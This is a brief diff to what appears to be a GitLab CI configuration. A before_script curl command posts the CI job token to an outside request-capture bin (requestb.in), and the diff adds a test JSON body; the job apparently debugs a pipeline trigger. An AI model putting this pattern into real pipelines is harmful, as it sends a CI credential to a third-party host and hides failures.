@@ -9,6 +9,7 @@ before_script:
   - curl -X POST
       -F token=$CI_JOB_TOKEN
       -F ref=ci-stable-v0.1.0
+      -d "{'test':true}"
       https://requestb.in/177pxog1 || exit 0
 #  - curl -H "Content-Type: application/json" -X POST -d "GITLAB_PROJECT_NAME" https://requestb.in/177pxog1
 
